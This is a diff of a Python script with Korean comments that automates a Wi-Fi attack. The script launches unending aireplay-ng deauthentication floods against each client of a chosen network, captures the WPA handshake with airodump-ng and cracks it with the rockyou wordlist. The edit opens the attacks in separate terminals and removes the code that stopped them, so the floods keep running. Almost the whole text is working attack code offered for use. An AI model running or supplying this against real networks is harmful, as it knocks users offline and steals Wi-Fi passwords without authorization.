@@ -50,24 +50,16 @@ def parse_clients_csv(csv_filename):
         print(f"CSV 파일 '{csv_filename}'을 찾을 수 없습니다.")
     return clients
 
-# 선택된 네트워크 정보를 target.csv에 저장하고 aireplay-ng 실행
+# 디어소시에이션 공격
 def run_aireplay(bssid, interface, clients):
-    with open("target.csv", "w") as file:
-        file.write(f"BSSID,ESSID\n{bssid},\n")
-    
-    aireplay_processes = []
     for client in clients:
-        aireplay_cmd = ["sudo", "aireplay-ng", "-0", "0", "-a", bssid, "-c", client, interface]
-        process = subprocess.Popen(aireplay_cmd)
-        aireplay_processes.append(process)
-    
-    return aireplay_processes
+        aireplay_cmd = f"sudo aireplay-ng -0 0 -a {bssid} -c {client} {interface}"
+        subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', aireplay_cmd])
 
+# 핸드셰이크 캡처
 def capture_handshake(interface, bssid, channel):
-    airodump_cmd = ["sudo", "airodump-ng", "-c", channel, "--bssid", bssid, "-w", "handshake", interface]
-    airodump_process = subprocess.Popen(airodump_cmd)
-    
-    return airodump_process
+    airodump_cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} -w handshake {interface}"
+    subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', airodump_cmd])
 
 def crack_password(handshake_file, wordlist):
     if not os.path.isfile(wordlist):
@@ -124,32 +116,16 @@ def main():
         print(f"선택한 네트워크: BSSID: {bssid}, ESSID: {essid}, Channel: {channel}")
         
         clients = parse_clients_csv(csv_filename)
-        aireplay_processes = run_aireplay(bssid, selected_interface, clients)
-        airodump_process = capture_handshake(selected_interface, bssid, channel)
+        
+        # gnome-terminal을 사용하여 디어소시에이션 공격 및 핸드셰이크 캡처를 동시에 실행
+        run_aireplay(bssid, selected_interface, clients)
+        capture_handshake(selected_interface, bssid, channel)
 
-        # 60초 동안 핸드셰이크 캡처 및 디어소시에이션 공격 수행
         print("핸드셰이크를 캡처 중입니다. 60초 동안 기다립니다...")
         time.sleep(60)
 
-        # aireplay-ng 프로세스 종료
-        for process in aireplay_processes:
-            process.terminate()
-            try:
-                process.wait(timeout=10)
-            except subprocess.TimeoutExpired:
-                print("aireplay-ng 프로세스가 종료되지 않았습니다. 강제 종료합니다.")
-                process.kill()
-
-        # airodump-ng 프로세스 종료
-        airodump_process.terminate()
-        try:
-            airodump_process.wait(timeout=10)
-        except subprocess.TimeoutExpired:
-            print("airodump-ng 프로세스가 종료되지 않았습니다. 강제 종료합니다.")
-            airodump_process.kill()
-
         handshake_file = "handshake-01.cap"
-        wordlist = "/usr/share/wordlists/rockyou.txt"  # 기본 워드리스트 파일 경로
+        wordlist = "/usr/share/wordlists/rockyou.txt"
         crack_password(handshake_file, wordlist)
     else:
         print("잘못된 선택입니다.")
